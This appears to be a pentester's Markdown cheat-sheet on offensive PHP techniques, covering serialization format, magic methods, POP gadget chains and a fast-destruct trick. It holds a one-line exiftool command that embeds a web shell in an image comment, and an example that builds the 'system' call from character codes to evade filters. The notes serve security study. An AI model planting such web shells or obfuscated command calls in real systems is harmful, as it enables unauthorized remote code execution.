
> [!NOTE] Tips and Tricks
> - `PHP` is case insensitive when calling defined keywords such as `class`
> - `PHP` is case sensitive when calling variables
> - Use `Object->property` to access a property
> - Use `Object::method()` to access a method

# Build functions from strings

```php
$A = chr(0x73); // s
$B = chr(0x79); // y
$X = chr(0x74); // t
$D = chr(0x65); // e
$E = chr(0x6d); // m

$hook = $A.$B.$A.$X.$D.$E; // system
echo $hook("ls"); // call the system function
```

# Polyglot `.jpg`

> Hide PHP code in comments

```bash
exiftool -Comment='<?php system($_GET['cmd']); ?>' pic.jpg
```

# Serialisation / Deserialization


> [!NOTE] unserialize() method
> The `serialize()` and `unserialize()` methods are used to serialize and unserialize a PHP object.
> - `serialize($customObject)` calls its `__sleep()` method
> - `unserialize($customObject)` calls its `__wakeup()` method
> - When dealing with objects, their property names will become `CustomClassNamepropertyname` (i.e. it concatenates the class name with the property name)
> - You should also check the `Phar://` wrapper

Serialized object : `'a:2:{s:5:"login";s:5:"guest";s:8:"password";s:4:"pass";}'`

In the previous serialized object, we can se that there are multiple items.
- Each items is structures as `type:length:value;` (the first item type is `a` which stands for `array` of length 2 and its value is the content between brackets)
- In an `key => value` array, `key` and `value` are represented as items separated with a semicolon.

So the previous array is 
```php
array (
	"login" => "guest",
	"password" => "pass"
)
```

| Type             | Serialized representation                                                                                                                                                                                                                                       |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| null             | **N;**                                                                                                                                                                                                                                                          |
| boolean          | **b:0;** or <br>**b:1;**                                                                                                                                                                                                                                        |
| integer          | **i:value;** <br> `i:+1337;` is valid as `1337`<br> `i:-1337;` is valid as `-1337` <br> `i:0;` = `i:-0;` = `i:+0;` = 0                                                                                                                                          |
| decimal          | **d:value;** (the decimal value cannot be wider than 16 digits, otherwise the 16th digit will be rounded)<br> `d:13.37;`   is valid for  `13.37`<br> `d:+13.37;` is valid for  `13.37`<br> `d:-13.37;` is valid for `-13.37`                                    |
| string           | **s:length:value;** <br> `s:4:"ABCD";` is valid for `ABCD`<br> `s:6:"AAAA"B";` is valid for `AAAA"B`                                                                                                                                                            |
| array            | **a:length:{key:value};**`{'key_serialized_representation';'value_serialized_representation'})` Key is the index in an indexed array <br>Key is the string value in an associative array                                                                        |
| object           | **O:namelength:name:numberOfElements:{keys:values;}** <br> (value as the same structure as array) <br>`'O:8:"stdClass":0:{}THISISJUNK'` is valid but `THISISJUNK` will be removed                                                                               |
| Object reference | **R:value_index;** <br>*(Indexes start to one and increase by one for each value from left to right e.g. in `O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}` the element  `s:10:"secretCode";N` has index 2) *<br>**R:2 means the second value** |

> [!NOTE] Risks
> Unsafe deserialization over user's untrusted inputs can lead to authentication bypass 

# Object 

**Light example**
```php
<?php
// Create the object class
class MyCustomPHPObject{};

// Create the object instance
$customObject = new MyCustomPHPObject;
// or $customObject = new MyCustomPHPObject();

// You can add properties even if not defined in the constructor
$customObject->key = "value";

// The object can be serialized if necessary
echo unserialize(serialize($customObject))->key;
?>
```

**Less light example**
```php
<?php

class CustomObject {
    public $data;

    // Constructor: Initializes the object
    public function __construct($data) {
        $this->data = $data;
    }

    // Wakeup: Handles actions when the object is unserialized
    public function __wakeup() {

    }

	// Sleep: Handles actions before the object is serialized
    public function __sleep() {
        // Return the names of the properties to serialize
        return ['data'];
    }

    // Destructor: Cleans up resources when the object is destroyed
    // unset() calls __destruct()
    // All referenced objects are detroyed at the end of any script
    public function __destruct() {

    }

	// String : called when the object is converted to a string
	public function __toString() {
		
    }
}

$obj = new CustomObject("blablabla");
echo serialize($obj;)
// O:12:"CustomObject":1:{s:18:"CustomObjectdata";s:9:"blablabla";}
echo unserialize(serialize($obj))->data;
// blablabla
?>
```


# PHP POP Chains
*(A.K.A. gadget chains)*

> When an attacker controls a serialized object that is passed into `unserialize()`, he can control the properties of the created object. This will then allow him the opportunity to hijack the flow of the application, by controlling the values passed into magic methods likeÂ `__wakeup()`.

> POP stands for **Property Oriented Programming**, and the name comes from the fact that the attacker can control all of the properties of the deserialized object.


> [!NOTE] Unserialize
> The new object is instanciated without having to call its constructor because `unserialize()` acts as a constructor. *The `__construct()` method will not be called after this method.*

> [!Tip] Encode it
> It is always preferable to be able to encode our gadgets chain in base64 because objects's properties and methods can have access modifiers which control from where they can be accessed (`public`, `protected`, `private`). During serialization, these access modifiers affect the format of the serialized data and adds null bytes to our serialized string.
> From PHP 5 to 7, it was necessary to take this into consideration when building gadget chain:
> ```php
> class Test {
>    public $public = 1;
>    protected $protected = 2;
>    private $private = 3;
> }
> ```
> This is serialized as follows: <br>
> `O:4:"Test":3:{s:6:"public";i:1;s:12:"\0*\0protected";i:2;s:13:"\0Test\0private";i:3;}`
> 
> The `\0` in the above serialization string are NULL bytes. 
> As you can see private and protected members are serialized with rather peculiar names: 
> - Private properties are prefixed with `\0ClassName\0` 
> - Protected properties with `\0*\0`.
> 
>**Since PHP 8, it is no longer necessary**



#### **Interesting [magic methods](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)**

- `__construct()` *called to instantiate an object*

> [!Warning] `__contruct()` 
> `__construct()` is not called when calling `unserialize()`

- `__destruct()` *called at the end of any script or when using `unset()` method or when nothing reference the object anymore*
> [!error] `__destruct()`
> Throw an error in `__destruct()` will return a fatal error
> - `unset()` will call `__destruct()`
> - `$obj = new Obj(); $obj = 4;` will call `__destruct()` because the instance is not referenced anymore
> - The end of the script will call every object's `__destruct()` method

-  `__call()` *is triggered when invoking inaccessible methods or attributes in an object context.*
-  `__callStatic()` *is triggered when invoking inaccessible methods or attributes in a static context*
-  `__get()` *is utilized for reading data from inaccessible (`protected` or `private`) or non-existing properties.*
-  `__set()` *is run when writing data to inaccessible (`protected` or `private`) or non-existing properties.*
-  `__isset()` *is triggered by calling `isset()` or `empty()` on inaccessible or non-existing properties.*
-  `__unset()` *is invoked when `unset()` is used on inaccessible or non-existing properties.*
-  `__sleep()` *is executed prior to any serialization*
-  `__wakeup()` *is executed prior to any unserialization*
-  `__serialize()` *must construct and return an associative array of key/value pairs that represent the serialized form of the object*
> [!NOTES] `__serialize`
> If both `__serialize()` and `__sleep()` are defined in the same object, only `__serialize()`
> If the object implements the `Serializable` interface, the interface's `serialize()` method will be ignored and `__serialize()` used instead.

-  `__unserialize()`
> [!NOTE] `__unserialize()`
> If both `__unserialize()` and `__wakeup()` are defined in the same object, only `__unserialize()` will be called.
> 

-  `__toString()` *called when it comes to represents the object as a string*
> [!error] `__toString()`
> Throw an error in `__toString()` will return a fatal error

-  `__invoke()` *called when a script tries to call an object as a function (e.g. using `is_callable()`*
-  `__set_state()` *called for classes exported by `var_export()`.*
-  `__clone()` *if defined, then the newly created object's `__clone()` method will be called* (e.g. `$obj2 = clone $obj1`)
-  `__debugInfo()` *called by `var_dump()` when dumping an object to get the properties that should be shown.*
> [!NOTE] `__debugInfo()`
> If the method isn't defined on an object, then all `public`, `protected` and `private` properties will be shown.

#### Fast `__destruct()` technique

> [!error] `__destruct()`
> Throw an error in `__destruct()` will return a fatal error
> - `unset()` will call `__destruct()`
> - `$obj = new Obj(); $obj = 4;` will call `__destruct()` because the instance is not referenced anymore
> - The end of the script will call every object's `__destruct()` method

> So, the trick is quite simple. We want the code to `unserialize()` an array which contains our object in 1st element and another element **with the same key or index**

**Example :**
```php
a:2:{i:0;O:4:"Junk":1:{s:5:"value";i:1339;}i:0;s:14:"useless string";}
```
1. The code will unserialize an array of 2 elements
2. It will unserialize the `Junk` object as the element of index 0
3. It will unserialize the string `useless string` as index 0 too....
4. The object `Junk` is not referenced anymore, `__destruct()` is called
5. It returns an array of two elements : `useless string` and `null`

> [!Important] It often starts here
> This fast destruct mechanism is the reason why most gadget chains start with a call to an object's `__destruct()` method. Controlling when a function is executed is essential to prevent the rest of a PHP script from modifying the object we've managed to instantiate thanks to deserialization.

> [!Tip] Tips
> - Don't forget that PHP is a non typed langage. It means that you can pass any object in the constructor, even an instance of the same class !
> - `unserialize()` **will set every attributes to the instance, even if they are not declared**


# Resources 

- [Very good article about PHP Pop chains](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp
- https://vickieli.dev/insecure%20deserialization/pop-chains/


